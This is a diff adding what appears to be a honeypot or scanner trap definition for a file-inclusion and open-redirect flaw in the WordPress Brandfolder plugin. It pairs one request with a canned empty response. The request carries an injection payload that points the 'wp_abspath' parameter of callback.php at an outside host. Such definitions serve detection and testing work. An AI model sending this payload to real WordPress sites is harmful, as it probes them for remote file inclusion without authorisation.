@@ -1,0 +1,26 @@
+id: brandfolder-open-redirect
+info:
+  name: WordPress Brandfolder - Open Redirect (RFI & LFI)
+  author: 0x_Akoko
+  description: 'WordPress Brandfolder is vulnerable to remote/local file inclusion
+    and allows remote attackers to inject an arbitrary URL into the ''callback.php''
+    endpoint via the ''wp_abspath'' parameter which will redirect the victim to it.
+
+    '
+  severity: medium
+  reference:
+  - https://www.exploit-db.com/exploits/39591
+  - https://wpscan.com/vulnerability/f850e182-f9c6-4264-b2b1-e587447fe4b1
+  metadata:
+    max-request: 1
+  tags: wp,brandfolder,edb,wpscan,wp-plugin,redirect,rfi,wordpress,lfi
+traps:
+- request:
+    method: GET
+    path: /wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
